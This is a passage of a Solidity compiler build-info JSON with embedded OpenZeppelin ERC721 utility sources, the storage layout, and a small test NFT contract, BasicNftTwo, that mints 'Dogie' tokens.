*/\\n    function getApproved(uint256 tokenId) external view returns (address operator);\\n\\n    /**\\n     * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.\\n     *\\n     * See {setApprovalForAll}\\n     */\\n    function isApprovedForAll(address owner, address operator) external view returns (bool);\\n}\\n\",\"keccak256\":\"0xab28a56179c1db258c9bf5235b382698cb650debecb51b23d12be9e241374b68\",\"license\":\"MIT\"},\"@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v4.6.0) (token/ERC721/IERC721Receiver.sol)\\n\\npragma solidity ^0.8.0;\\n\\n/**\\n * @title ERC721 token receiver interface\\n * @dev Interface for any contract that wants to support safeTransfers\\n * from ERC721 asset contracts.\\n */\\ninterface IERC721Receiver {\\n    /**\\n     * @dev Whenever an {IERC721} `tokenId` token is transferred to this contract via {IERC721-safeTransferFrom}\\n     * by `operator` from `from`, this function is called.\\n     *\\n     * It must return its Solidity selector to confirm the token transfer.\\n     * If any other value is returned or the interface is not implemented by the recipient, the transfer will be reverted.\\n     *\\n     * The selector can be obtained in Solidity with `IERC721Receiver.onERC721Received.selector`.\\n     */\\n    function onERC721Received(\\n        address operator,\\n        address from,\\n        uint256 tokenId,\\n        bytes calldata data\\n    ) external returns (bytes4);\\n}\\n\",\"keccak256\":\"0xa82b58eca1ee256be466e536706850163d2ec7821945abd6b4778cfb3bee37da\",\"license\":\"MIT\"},\"@openzeppelin/contracts/token/ERC721/extensions/IERC721Metadata.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts v4.4.1 (token/ERC721/extensions/IERC721Metadata.sol)\\n\\npragma solidity ^0.8.0;\\n\\nimport \\\"../IERC721.sol\\\";\\n\\n/**\\n * @title ERC-721 Non-Fungible Token Standard, optional metadata extension\\n * @dev See https://eips.ethereum.org/EIPS/eip-721\\n */\\ninterface IERC721Metadata is IERC721 {\\n    /**\\n     * @dev Returns the token collection name.\\n     */\\n    function name() external view returns (string memory);\\n\\n    /**\\n     * @dev Returns the token collection symbol.\\n     */\\n    function symbol() external view returns (string memory);\\n\\n    /**\\n     * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token.\\n     */\\n    function tokenURI(uint256 tokenId) external view returns (string memory);\\n}\\n\",\"keccak256\":\"0x75b829ff2f26c14355d1cba20e16fe7b29ca58eb5fef665ede48bc0f9c6c74b9\",\"license\":\"MIT\"},\"@openzeppelin/contracts/utils/Address.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v4.8.0) (utils/Address.sol)\\n\\npragma solidity ^0.8.1;\\n\\n/**\\n * @dev Collection of functions related to the address type\\n */\\nlibrary Address {\\n    /**\\n     * @dev Returns true if `account` is a contract.\\n     *\\n     * [IMPORTANT]\\n     * ====\\n     * It is unsafe to assume that an address for which this function returns\\n     * false is an externally-owned account (EOA) and not a contract.\\n     *\\n     * Among others, `isContract` will return false for the following\\n     * types of addresses:\\n     *\\n     *  - an externally-owned account\\n     *  - a contract in construction\\n     *  - an address where a contract will be created\\n     *  - an address where a contract lived, but was destroyed\\n     * ====\\n     *\\n     * [IMPORTANT]\\n     * ====\\n     * You shouldn't rely on `isContract` to protect against flash loan attacks!\\n     *\\n     * Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets\\n     * like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract\\n     * constructor.\\n     * ====\\n     */\\n    function isContract(address account) internal view returns (bool) {\\n        // This method relies on extcodesize/address.code.length, which returns 0\\n        // for contracts in construction, since the code is only stored at the end\\n        // of the constructor execution.\\n\\n        return account.code.length > 0;\\n    }\\n\\n    /**\\n     * @dev Replacement for Solidity's `transfer`: sends `amount` wei to\\n     * `recipient`, forwarding all available gas and reverting on errors.\\n     *\\n     * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost\\n     * of certain opcodes, possibly making contracts go over the 2300 gas limit\\n     * imposed by `transfer`, making them unable to receive funds via\\n     * `transfer`. {sendValue} removes this limitation.\\n     *\\n     * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].\\n     *\\n     * IMPORTANT: because control is transferred to `recipient`, care must be\\n     * taken to not create reentrancy vulnerabilities. Consider using\\n     * {ReentrancyGuard} or the\\n     * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].\\n     */\\n    function sendValue(address payable recipient, uint256 amount) internal {\\n        require(address(this).balance >= amount, \\\"Address: insufficient balance\\\");\\n\\n        (bool success, ) = recipient.call{value: amount}(\\\"\\\");\\n        require(success, \\\"Address: unable to send value, recipient may have reverted\\\");\\n    }\\n\\n    /**\\n     * @dev Performs a Solidity function call using a low level `call`. A\\n     * plain `call` is an unsafe replacement for a function call: use this\\n     * function instead.\\n     *\\n     * If `target` reverts with a revert reason, it is bubbled up by this\\n     * function (like regular Solidity function calls).\\n     *\\n     * Returns the raw returned data. To convert to the expected return value,\\n     * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].\\n     *\\n     * Requirements:\\n     *\\n     * - `target` must be a contract.\\n     * - calling `target` with `data` must not revert.\\n     *\\n     * _Available since v3.1._\\n     */\\n    function functionCall(address target, bytes memory data) internal returns (bytes memory) {\\n        return functionCallWithValue(target, data, 0, \\\"Address: low-level call failed\\\");\\n    }\\n\\n    /**\\n     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with\\n     * `errorMessage` as a fallback revert reason when `target` reverts.\\n     *\\n     * _Available since v3.1._\\n     */\\n    function functionCall(\\n        address target,\\n        bytes memory data,\\n        string memory errorMessage\\n    ) internal returns (bytes memory) {\\n        return functionCallWithValue(target, data, 0, errorMessage);\\n    }\\n\\n    /**\\n     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],\\n     * but also transferring `value` wei to `target`.\\n     *\\n     * Requirements:\\n     *\\n     * - the calling contract must have an ETH balance of at least `value`.\\n     * - the called Solidity function must be `payable`.\\n     *\\n     * _Available since v3.1._\\n     */\\n    function functionCallWithValue(\\n        address target,\\n        bytes memory data,\\n        uint256 value\\n    ) internal returns (bytes memory) {\\n        return functionCallWithValue(target, data, value, \\\"Address: low-level call with value failed\\\");\\n    }\\n\\n    /**\\n     * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but\\n     * with `errorMessage` as a fallback revert reason when `target` reverts.\\n     *\\n     * _Available since v3.1._\\n     */\\n    function functionCallWithValue(\\n        address target,\\n        bytes memory data,\\n        uint256 value,\\n        string memory errorMessage\\n    ) internal returns (bytes memory) {\\n        require(address(this).balance >= value, \\\"Address: insufficient balance for call\\\");\\n        (bool success, bytes memory returndata) = target.call{value: value}(data);\\n        return verifyCallResultFromTarget(target, success, returndata, errorMessage);\\n    }\\n\\n    /**\\n     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],\\n     * but performing a static call.\\n     *\\n     * _Available since v3.3._\\n     */\\n    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {\\n        return functionStaticCall(target, data, \\\"Address: low-level static call failed\\\");\\n    }\\n\\n    /**\\n     * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],\\n     * but performing a static call.\\n     *\\n     * _Available since v3.3._\\n     */\\n    function functionStaticCall(\\n        address target,\\n        bytes memory data,\\n        string memory errorMessage\\n    ) internal view returns (bytes memory) {\\n        (bool success, bytes memory returndata) = target.staticcall(data);\\n        return verifyCallResultFromTarget(target, success, returndata, errorMessage);\\n    }\\n\\n    /**\\n     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],\\n     * but performing a delegate call.\\n     *\\n     * _Available since v3.4._\\n     */\\n    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {\\n        return functionDelegateCall(target, data, \\\"Address: low-level delegate call failed\\\");\\n    }\\n\\n    /**\\n     * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],\\n     * but performing a delegate call.\\n     *\\n     * _Available since v3.4._\\n     */\\n    function functionDelegateCall(\\n        address target,\\n        bytes memory data,\\n        string memory errorMessage\\n    ) internal returns (bytes memory) {\\n        (bool success, bytes memory returndata) = target.delegatecall(data);\\n        return verifyCallResultFromTarget(target, success, returndata, errorMessage);\\n    }\\n\\n    /**\\n     * @dev Tool to verify that a low level call to smart-contract was successful, and revert (either by bubbling\\n     * the revert reason or using the provided one) in case of unsuccessful call or if target was not a contract.\\n     *\\n     * _Available since v4.8._\\n     */\\n    function verifyCallResultFromTarget(\\n        address target,\\n        bool success,\\n        bytes memory returndata,\\n        string memory errorMessage\\n    ) internal view returns (bytes memory) {\\n        if (success) {\\n            if (returndata.length == 0) {\\n                // only check isContract if the call was successful and the return data is empty\\n                // otherwise we already know that it was a contract\\n                require(isContract(target), \\\"Address: call to non-contract\\\");\\n            }\\n            return returndata;\\n        } else {\\n            _revert(returndata, errorMessage);\\n        }\\n    }\\n\\n    /**\\n     * @dev Tool to verify that a low level call was successful, and revert if it wasn't, either by bubbling the\\n     * revert reason or using the provided one.\\n     *\\n     * _Available since v4.3._\\n     */\\n    function verifyCallResult(\\n        bool success,\\n        bytes memory returndata,\\n        string memory errorMessage\\n    ) internal pure returns (bytes memory) {\\n        if (success) {\\n            return returndata;\\n        } else {\\n            _revert(returndata, errorMessage);\\n        }\\n    }\\n\\n    function _revert(bytes memory returndata, string memory errorMessage) private pure {\\n        // Look for revert reason and bubble it up if present\\n        if (returndata.length > 0) {\\n            // The easiest way to bubble the revert reason is using memory via assembly\\n            /// @solidity memory-safe-assembly\\n            assembly {\\n                let returndata_size := mload(returndata)\\n                revert(add(32, returndata), returndata_size)\\n            }\\n        } else {\\n            revert(errorMessage);\\n        }\\n    }\\n}\\n\",\"keccak256\":\"0xf96f969e24029d43d0df89e59d365f277021dac62b48e1c1e3ebe0acdd7f1ca1\",\"license\":\"MIT\"},\"@openzeppelin/contracts/utils/Context.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts v4.4.1 (utils/Context.sol)\\n\\npragma solidity ^0.8.0;\\n\\n/**\\n * @dev Provides information about the current execution context, including the\\n * sender of the transaction and its data. While these are generally available\\n * via msg.sender and msg.data, they should not be accessed in such a direct\\n * manner, since when dealing with meta-transactions the account sending and\\n * paying for execution may not be the actual sender (as far as an application\\n * is concerned).\\n *\\n * This contract is only required for intermediate, library-like contracts.\\n */\\nabstract contract Context {\\n    function _msgSender() internal view virtual returns (address) {\\n        return msg.sender;\\n    }\\n\\n    function _msgData() internal view virtual returns (bytes calldata) {\\n        return msg.data;\\n    }\\n}\\n\",\"keccak256\":\"0xe2e337e6dde9ef6b680e07338c493ebea1b5fd09b43424112868e9cc1706bca7\",\"license\":\"MIT\"},\"@openzeppelin/contracts/utils/Strings.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v4.8.0) (utils/Strings.sol)\\n\\npragma solidity ^0.8.0;\\n\\nimport \\\"./math/Math.sol\\\";\\n\\n/**\\n * @dev String operations.\\n */\\nlibrary Strings {\\n    bytes16 private constant _SYMBOLS = \\\"0123456789abcdef\\\";\\n    uint8 private constant _ADDRESS_LENGTH = 20;\\n\\n    /**\\n     * @dev Converts a `uint256` to its ASCII `string` decimal representation.\\n     */\\n    function toString(uint256 value) internal pure returns (string memory) {\\n        unchecked {\\n            uint256 length = Math.log10(value) + 1;\\n            string memory buffer = new string(length);\\n            uint256 ptr;\\n            /// @solidity memory-safe-assembly\\n            assembly {\\n                ptr := add(buffer, add(32, length))\\n            }\\n            while (true) {\\n                ptr--;\\n                /// @solidity memory-safe-assembly\\n                assembly {\\n                    mstore8(ptr, byte(mod(value, 10), _SYMBOLS))\\n                }\\n                value /= 10;\\n                if (value == 0) break;\\n            }\\n            return buffer;\\n        }\\n    }\\n\\n    /**\\n     * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation.\\n     */\\n    function toHexString(uint256 value) internal pure returns (string memory) {\\n        unchecked {\\n            return toHexString(value, Math.log256(value) + 1);\\n        }\\n    }\\n\\n    /**\\n     * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation with fixed length.\\n     */\\n    function toHexString(uint256 value, uint256 length) internal pure returns (string memory) {\\n        bytes memory buffer = new bytes(2 * length + 2);\\n        buffer[0] = \\\"0\\\";\\n        buffer[1] = \\\"x\\\";\\n        for (uint256 i = 2 * length + 1; i > 1; --i) {\\n            buffer[i] = _SYMBOLS[value & 0xf];\\n            value >>= 4;\\n        }\\n        require(value == 0, \\\"Strings: hex length insufficient\\\");\\n        return string(buffer);\\n    }\\n\\n    /**\\n     * @dev Converts an `address` with fixed length of 20 bytes to its not checksummed ASCII `string` hexadecimal representation.\\n     */\\n    function toHexString(address addr) internal pure returns (string memory) {\\n        return toHexString(uint256(uint160(addr)), _ADDRESS_LENGTH);\\n    }\\n}\\n\",\"keccak256\":\"0xa4d1d62251f8574deb032a35fc948386a9b4de74b812d4f545a1ac120486b48a\",\"license\":\"MIT\"},\"@openzeppelin/contracts/utils/introspection/ERC165.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts v4.4.1 (utils/introspection/ERC165.sol)\\n\\npragma solidity ^0.8.0;\\n\\nimport \\\"./IERC165.sol\\\";\\n\\n/**\\n * @dev Implementation of the {IERC165} interface.\\n *\\n * Contracts that want to implement ERC165 should inherit from this contract and override {supportsInterface} to check\\n * for the additional interface id that will be supported. For example:\\n *\\n * ```solidity\\n * function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {\\n *     return interfaceId == type(MyInterface).interfaceId || super.supportsInterface(interfaceId);\\n * }\\n * ```\\n *\\n * Alternatively, {ERC165Storage} provides an easier to use but more expensive implementation.\\n */\\nabstract contract ERC165 is IERC165 {\\n    /**\\n     * @dev See {IERC165-supportsInterface}.\\n     */\\n    function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {\\n        return interfaceId == type(IERC165).interfaceId;\\n    }\\n}\\n\",\"keccak256\":\"0xd10975de010d89fd1c78dc5e8a9a7e7f496198085c151648f20cba166b32582b\",\"license\":\"MIT\"},\"@openzeppelin/contracts/utils/introspection/IERC165.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts v4.4.1 (utils/introspection/IERC165.sol)\\n\\npragma solidity ^0.8.0;\\n\\n/**\\n * @dev Interface of the ERC165 standard, as defined in the\\n * https://eips.ethereum.org/EIPS/eip-165[EIP].\\n *\\n * Implementers can declare support of contract interfaces, which can then be\\n * queried by others ({ERC165Checker}).\\n *\\n * For an implementation, see {ERC165}.\\n */\\ninterface IERC165 {\\n    /**\\n     * @dev Returns true if this contract implements the interface defined by\\n     * `interfaceId`. See the corresponding\\n     * https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified[EIP section]\\n     * to learn more about how these ids are created.\\n     *\\n     * This function call must use less than 30 000 gas.\\n     */\\n    function supportsInterface(bytes4 interfaceId) external view returns (bool);\\n}\\n\",\"keccak256\":\"0x447a5f3ddc18419d41ff92b3773fb86471b1db25773e07f877f548918a185bf1\",\"license\":\"MIT\"},\"@openzeppelin/contracts/utils/math/Math.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v4.8.0) (utils/math/Math.sol)\\n\\npragma solidity ^0.8.0;\\n\\n/**\\n * @dev Standard math utilities missing in the Solidity language.\\n */\\nlibrary Math {\\n    enum Rounding {\\n        Down, // Toward negative infinity\\n        Up, // Toward infinity\\n        Zero // Toward zero\\n    }\\n\\n    /**\\n     * @dev Returns the largest of two numbers.\\n     */\\n    function max(uint256 a, uint256 b) internal pure returns (uint256) {\\n        return a > b ? a : b;\\n    }\\n\\n    /**\\n     * @dev Returns the smallest of two numbers.\\n     */\\n    function min(uint256 a, uint256 b) internal pure returns (uint256) {\\n        return a < b ? a : b;\\n    }\\n\\n    /**\\n     * @dev Returns the average of two numbers. The result is rounded towards\\n     * zero.\\n     */\\n    function average(uint256 a, uint256 b) internal pure returns (uint256) {\\n        // (a + b) / 2 can overflow.\\n        return (a & b) + (a ^ b) / 2;\\n    }\\n\\n    /**\\n     * @dev Returns the ceiling of the division of two numbers.\\n     *\\n     * This differs from standard division with `/` in that it rounds up instead\\n     * of rounding down.\\n     */\\n    function ceilDiv(uint256 a, uint256 b) internal pure returns (uint256) {\\n        // (a + b - 1) / b can overflow on addition, so we distribute.\\n        return a == 0 ? 0 : (a - 1) / b + 1;\\n    }\\n\\n    /**\\n     * @notice Calculates floor(x * y / denominator) with full precision. Throws if result overflows a uint256 or denominator == 0\\n     * @dev Original credit to Remco Bloemen under MIT license (https://xn--2-umb.com/21/muldiv)\\n     * with further edits by Uniswap Labs also under MIT license.\\n     */\\n    function mulDiv(\\n        uint256 x,\\n        uint256 y,\\n        uint256 denominator\\n    ) internal pure returns (uint256 result) {\\n        unchecked {\\n            // 512-bit multiply [prod1 prod0] = x * y. Compute the product mod 2^256 and mod 2^256 - 1, then use\\n            // use the Chinese Remainder Theorem to reconstruct the 512 bit result. The result is stored in two 256\\n            // variables such that product = prod1 * 2^256 + prod0.\\n            uint256 prod0; // Least significant 256 bits of the product\\n            uint256 prod1; // Most significant 256 bits of the product\\n            assembly {\\n                let mm := mulmod(x, y, not(0))\\n                prod0 := mul(x, y)\\n                prod1 := sub(sub(mm, prod0), lt(mm, prod0))\\n            }\\n\\n            // Handle non-overflow cases, 256 by 256 division.\\n            if (prod1 == 0) {\\n                return prod0 / denominator;\\n            }\\n\\n            // Make sure the result is less than 2^256. Also prevents denominator == 0.\\n            require(denominator > prod1);\\n\\n            ///////////////////////////////////////////////\\n            // 512 by 256 division.\\n            ///////////////////////////////////////////////\\n\\n            // Make division exact by subtracting the remainder from [prod1 prod0].\\n            uint256 remainder;\\n            assembly {\\n                // Compute remainder using mulmod.\\n                remainder := mulmod(x, y, denominator)\\n\\n                // Subtract 256 bit number from 512 bit number.\\n                prod1 := sub(prod1, gt(remainder, prod0))\\n                prod0 := sub(prod0, remainder)\\n            }\\n\\n            // Factor powers of two out of denominator and compute largest power of two divisor of denominator. Always >= 1.\\n            // See https://cs.stackexchange.com/q/138556/92363.\\n\\n            // Does not overflow because the denominator cannot be zero at this stage in the function.\\n            uint256 twos = denominator & (~denominator + 1);\\n            assembly {\\n                // Divide denominator by twos.\\n                denominator := div(denominator, twos)\\n\\n                // Divide [prod1 prod0] by twos.\\n                prod0 := div(prod0, twos)\\n\\n                // Flip twos such that it is 2^256 / twos. If twos is zero, then it becomes one.\\n                twos := add(div(sub(0, twos), twos), 1)\\n            }\\n\\n            // Shift in bits from prod1 into prod0.\\n            prod0 |= prod1 * twos;\\n\\n            // Invert denominator mod 2^256. Now that denominator is an odd number, it has an inverse modulo 2^256 such\\n            // that denominator * inv = 1 mod 2^256. Compute the inverse by starting with a seed that is correct for\\n            // four bits. That is, denominator * inv = 1 mod 2^4.\\n            uint256 inverse = (3 * denominator) ^ 2;\\n\\n            // Use the Newton-Raphson iteration to improve the precision. Thanks to Hensel's lifting lemma, this also works\\n            // in modular arithmetic, doubling the correct bits in each step.\\n            inverse *= 2 - denominator * inverse; // inverse mod 2^8\\n            inverse *= 2 - denominator * inverse; // inverse mod 2^16\\n            inverse *= 2 - denominator * inverse; // inverse mod 2^32\\n            inverse *= 2 - denominator * inverse; // inverse mod 2^64\\n            inverse *= 2 - denominator * inverse; // inverse mod 2^128\\n            inverse *= 2 - denominator * inverse; // inverse mod 2^256\\n\\n            // Because the division is now exact we can divide by multiplying with the modular inverse of denominator.\\n            // This will give us the correct result modulo 2^256. Since the preconditions guarantee that the outcome is\\n            // less than 2^256, this is the final result. We don't need to compute the high bits of the result and prod1\\n            // is no longer required.\\n            result = prod0 * inverse;\\n            return result;\\n        }\\n    }\\n\\n    /**\\n     * @notice Calculates x * y / denominator with full precision, following the selected rounding direction.\\n     */\\n    function mulDiv(\\n        uint256 x,\\n        uint256 y,\\n        uint256 denominator,\\n        Rounding rounding\\n    ) internal pure returns (uint256) {\\n        uint256 result = mulDiv(x, y, denominator);\\n        if (rounding == Rounding.Up && mulmod(x, y, denominator) > 0) {\\n            result += 1;\\n        }\\n        return result;\\n    }\\n\\n    /**\\n     * @dev Returns the square root of a number. If the number is not a perfect square, the value is rounded down.\\n     *\\n     * Inspired by Henry S. Warren, Jr.'s \\\"Hacker's Delight\\\" (Chapter 11).\\n     */\\n    function sqrt(uint256 a) internal pure returns (uint256) {\\n        if (a == 0) {\\n            return 0;\\n        }\\n\\n        // For our first guess, we get the biggest power of 2 which is smaller than the square root of the target.\\n        //\\n        // We know that the \\\"msb\\\" (most significant bit) of our target number `a` is a power of 2 such that we have\\n        // `msb(a) <= a < 2*msb(a)`. This value can be written `msb(a)=2**k` with `k=log2(a)`.\\n        //\\n        // This can be rewritten `2**log2(a) <= a < 2**(log2(a) + 1)`\\n        // \\u2192 `sqrt(2**k) <= sqrt(a) < sqrt(2**(k+1))`\\n        // \\u2192 `2**(k/2) <= sqrt(a) < 2**((k+1)/2) <= 2**(k/2 + 1)`\\n        //\\n        // Consequently, `2**(log2(a) / 2)` is a good first approximation of `sqrt(a)` with at least 1 correct bit.\\n        uint256 result = 1 << (log2(a) >> 1);\\n\\n        // At this point `result` is an estimation with one bit of precision. We know the true value is a uint128,\\n        // since it is the square root of a uint256. Newton's method converges quadratically (precision doubles at\\n        // every iteration). We thus need at most 7 iteration to turn our partial result with one bit of precision\\n        // into the expected uint128 result.\\n        unchecked {\\n            result = (result + a / result) >> 1;\\n            result = (result + a / result) >> 1;\\n            result = (result + a / result) >> 1;\\n            result = (result + a / result) >> 1;\\n            result = (result + a / result) >> 1;\\n            result = (result + a / result) >> 1;\\n            result = (result + a / result) >> 1;\\n            return min(result, a / result);\\n        }\\n    }\\n\\n    /**\\n     * @notice Calculates sqrt(a), following the selected rounding direction.\\n     */\\n    function sqrt(uint256 a, Rounding rounding) internal pure returns (uint256) {\\n        unchecked {\\n            uint256 result = sqrt(a);\\n            return result + (rounding == Rounding.Up && result * result < a ? 1 : 0);\\n        }\\n    }\\n\\n    /**\\n     * @dev Return the log in base 2, rounded down, of a positive value.\\n     * Returns 0 if given 0.\\n     */\\n    function log2(uint256 value) internal pure returns (uint256) {\\n        uint256 result = 0;\\n        unchecked {\\n            if (value >> 128 > 0) {\\n                value >>= 128;\\n                result += 128;\\n            }\\n            if (value >> 64 > 0) {\\n                value >>= 64;\\n                result += 64;\\n            }\\n            if (value >> 32 > 0) {\\n                value >>= 32;\\n                result += 32;\\n            }\\n            if (value >> 16 > 0) {\\n                value >>= 16;\\n                result += 16;\\n            }\\n            if (value >> 8 > 0) {\\n                value >>= 8;\\n                result += 8;\\n            }\\n            if (value >> 4 > 0) {\\n                value >>= 4;\\n                result += 4;\\n            }\\n            if (value >> 2 > 0) {\\n                value >>= 2;\\n                result += 2;\\n            }\\n            if (value >> 1 > 0) {\\n                result += 1;\\n            }\\n        }\\n        return result;\\n    }\\n\\n    /**\\n     * @dev Return the log in base 2, following the selected rounding direction, of a positive value.\\n     * Returns 0 if given 0.\\n     */\\n    function log2(uint256 value, Rounding rounding) internal pure returns (uint256) {\\n        unchecked {\\n            uint256 result = log2(value);\\n            return result + (rounding == Rounding.Up && 1 << result < value ? 1 : 0);\\n        }\\n    }\\n\\n    /**\\n     * @dev Return the log in base 10, rounded down, of a positive value.\\n     * Returns 0 if given 0.\\n     */\\n    function log10(uint256 value) internal pure returns (uint256) {\\n        uint256 result = 0;\\n        unchecked {\\n            if (value >= 10**64) {\\n                value /= 10**64;\\n                result += 64;\\n            }\\n            if (value >= 10**32) {\\n                value /= 10**32;\\n                result += 32;\\n            }\\n            if (value >= 10**16) {\\n                value /= 10**16;\\n                result += 16;\\n            }\\n            if (value >= 10**8) {\\n                value /= 10**8;\\n                result += 8;\\n            }\\n            if (value >= 10**4) {\\n                value /= 10**4;\\n                result += 4;\\n            }\\n            if (value >= 10**2) {\\n                value /= 10**2;\\n                result += 2;\\n            }\\n            if (value >= 10**1) {\\n                result += 1;\\n            }\\n        }\\n        return result;\\n    }\\n\\n    /**\\n     * @dev Return the log in base 10, following the selected rounding direction, of a positive value.\\n     * Returns 0 if given 0.\\n     */\\n    function log10(uint256 value, Rounding rounding) internal pure returns (uint256) {\\n        unchecked {\\n            uint256 result = log10(value);\\n            return result + (rounding == Rounding.Up && 10**result < value ? 1 : 0);\\n        }\\n    }\\n\\n    /**\\n     * @dev Return the log in base 256, rounded down, of a positive value.\\n     * Returns 0 if given 0.\\n     *\\n     * Adding one to the result gives the number of pairs of hex symbols needed to represent `value` as a hex string.\\n     */\\n    function log256(uint256 value) internal pure returns (uint256) {\\n        uint256 result = 0;\\n        unchecked {\\n            if (value >> 128 > 0) {\\n                value >>= 128;\\n                result += 16;\\n            }\\n            if (value >> 64 > 0) {\\n                value >>= 64;\\n                result += 8;\\n            }\\n            if (value >> 32 > 0) {\\n                value >>= 32;\\n                result += 4;\\n            }\\n            if (value >> 16 > 0) {\\n                value >>= 16;\\n                result += 2;\\n            }\\n            if (value >> 8 > 0) {\\n                result += 1;\\n            }\\n        }\\n        return result;\\n    }\\n\\n    /**\\n     * @dev Return the log in base 10, following the selected rounding direction, of a positive value.\\n     * Returns 0 if given 0.\\n     */\\n    function log256(uint256 value, Rounding rounding) internal pure returns (uint256) {\\n        unchecked {\\n            uint256 result = log256(value);\\n            return result + (rounding == Rounding.Up && 1 << (result * 8) < value ? 1 : 0);\\n        }\\n    }\\n}\\n\",\"keccak256\":\"0xa1e8e83cd0087785df04ac79fb395d9f3684caeaf973d9e2c71caef723a3a5d6\",\"license\":\"MIT\"},\"contracts/test/BasicNftTwo.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\npragma solidity ^0.8.7;\\nimport \\\"@openzeppelin/contracts/token/ERC721/ERC721.sol\\\";\\n\\ncontract BasicNftTwo is ERC721 {\\n    string public constant TOKEN_URI =\\n        \\\"ipfs://QmdryoExpgEQQQgJPoruwGJyZmz6SqV4FRTX1i73CT3iXn\\\";\\n    uint256 private s_tokenCounter;\\n    event DogMinted(uint256 indexed tokenId);\\n\\n    constructor() ERC721(\\\"Dogie\\\", \\\"DOG\\\") {\\n        s_tokenCounter = 0;\\n    }\\n\\n    function mintNft() public {\\n        _safeMint(msg.sender, s_tokenCounter);\\n        emit DogMinted(s_tokenCounter);\\n        s_tokenCounter = s_tokenCounter + 1;\\n    }\\n\\n    function tokenURI(\\n        uint256 tokenId\\n    ) public view override returns (string memory) {\\n        require(\\n            _exists(tokenId),\\n            \\\"ERC721Metadata : URI query for nonexistent token\\\"\\n        );\\n    }\\n\\n    function getTokenCounter() public view returns (uint256) {\\n        return s_tokenCounter;\\n    }\\n}\\n\",\"keccak256\":\"0xbfa7ae1f387559347d086c87f0309a904c6fdd275d9efabaa8ac530c965e7795\",\"license\":\"MIT\"}},\"version\":1}","storageLayout":{"storage":[{"astId":79,"contract":"contracts/test/BasicNftTwo.sol:BasicNftTwo","label":"_name","offset":0,"slot":"0","type":"t_string_storage"},{"astId":81,"contract":"contracts/test/BasicNftTwo.sol:BasicNftTwo","label":"_symbol","offset":0,"slot":"1","type":"t_string_storage"},{"astId":85,"contract":"contracts/test/BasicNftTwo.sol:BasicNftTwo","label":"_owners","offset":0,"slot":"2","type":"t_mapping(t_uint256,t_address)"},{"astId":89,"contract":"contracts/test/BasicNftTwo.sol:BasicNftTwo","label":"_balances","offset":0,"slot":"3","type":"t_mapping(t_address,t_uint256)"},{"astId":93,"contract":"contracts/test/BasicNftTwo.sol:BasicNftTwo","label":"_tokenApprovals","offset":0,"slot":"4","type":"t_mapping(t_uint256,t_address)"},{"astId":99,"contract":"contracts/test/BasicNftTwo.sol:BasicNftTwo","label":"_operatorApprovals","offset":0,"slot":"5","type":"t_mapping(t_address,t_mapping(t_address,t_bool))"},{"astId":3278,"contract":"contracts/test/BasicNftTwo.sol:BasicNftTwo","label":"s_tokenCounter","offset":0,"slot":"6","type":"t_uint256"}],"types":{"t_address":{"encoding":"inplace","label":"address","numberOfBytes":"20"},"t_bool":{"encoding":"inplace","label":"bool","numberOfBytes":"1"},"t_mapping(t_address,t_bool)":{"encoding":"mapping","key":"t_address","label":"mapping(address => bool)","numberOfBytes":"32","value":"t_bool"},"t_mapping(t_address,t_mapping(t_address,t_bool))":{"encoding":"mapping","key":"t_address","label":"mapping(address => mapping(address => bool))","numberOfBytes":"32","value":"t_mapping(t_address,t_bool)"},"t_mapping(t_address,t_uint256)":{"encoding":"mapping","key":"t_address","label":"mapping(address => uint256)","numberOfBytes":"32","value":"t_uint256"},"t_mapping(t_uint256,t_address)":{"encoding":"mapping","key":"t_uint256","label":"mapping(uint256 => address)","numberOfBytes":"32","value":"t_address"},"t_string_storage":{"encoding":"bytes","label":"string","numberOfBytes":"32"},"t_uint256":{"encoding":"inplace","label":"uint256","numberOfBytes":"32"}}},"userdoc":{"kind":"user","methods":{},"version":1}}}}}}